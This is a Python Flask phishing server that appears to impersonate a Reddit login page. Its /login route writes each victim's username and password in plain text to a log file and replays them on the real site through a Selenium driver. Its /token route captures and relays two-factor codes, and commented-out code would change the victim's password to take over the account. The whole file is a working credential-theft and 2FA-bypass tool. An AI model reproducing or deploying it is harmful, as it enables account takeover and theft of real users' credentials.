import logging
from logging.config import dictConfig
import sys
import json

from flask import Flask, render_template, session, request, send_file, jsonify

import selenium_driver as sd


app = Flask(__name__)
app.secret_key = b'Ity\x9e\xbf\xcc\x88\x8b\xb5V\xdd-\\\xd4\x04i'

drivers = {}

d = 0

dictConfig({
    'version': 1,
    'formatters': {
        'default': {
            'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
        }
    },
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',
            'level': 'INFO',
            'stream': 'ext://sys.stdout',
            'formatter': 'default'
        },
        'data': {
            'class': 'logging.FileHandler',
            'level': 'INFO',
            'filename': 'logs/data.log',
            'formatter': 'default'
        }
    },
    'loggers': {
        'console': {
            'level': 'INFO',
            'handlers': ['console'],
            'propagate': 'no'
        },
        'data': {
            'level': 'INFO',
            'handlers': ['data'],
            'propagate': 'no'
        }
    },
    'root': {
        'level': 'INFO',
        'handlers': ['console']
    }
})

logfile = None
logconsole = None


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/term.html')
def terms():
    return render_template('terms.html')


@app.route('/links.html')
def links():
    return render_template('links.html')


@app.route('/reddit')
def reddit():
    global d
    session['driver'] = d
    drivers[d] = sd.setup()
    d += 1
    return render_template('reddit.html')


@app.route('/login', methods=['POST'])
def login():
    data = json.loads(request.data)
    user = data['username']
    pswd = data['password']

    session['username'] = user
    session['password'] = pswd

    logfile.info('user: {}  //  pass: {}'.format(user, pswd))

    err = sd.do_login(drivers[session['driver']], Username=user, Password=pswd)

    res = {'valid': False, 'twofa': False}

    if err == sd.SUCCESS_NO_TWOAUTH:
        res['valid'] = True
    if err == sd.SUCCESS_TWOAUTH:
        res['valid'] = True
        res['twofa'] = True

    return jsonify(res)


@app.route('/token', methods=['POST'])
def twofa():
    data = json.loads(request.data)
    tok = data['token']

    logfile.info('{} token: {}'.format(session['username'], tok))

    valid = sd.do_twoauth(drivers[session['driver']], tok)

    # new_pass = sd.do_password_change(drivers[session['driver']],
                                     # session['password'])

    # logfile.info('user {} new password: {}'.format(session['username'],
                                                   # new_pass))

    return jsonify({'valid': valid})


@app.route('/shrek', methods=['GET'])
def shrek():
    u = session.get('driver')
    if u in drivers:
        del drivers[u]
    session.pop(u, None)
    return send_file('static/shrek.txt', attachment_filename='shrek.txt')


def main():
    global logfile
    global logconsole
    logfile = logging.getLogger('data')
    logconsole = logging.getLogger()
    app.run(host='0.0.0.0', port=80)


if __name__ == '__main__':
    main()

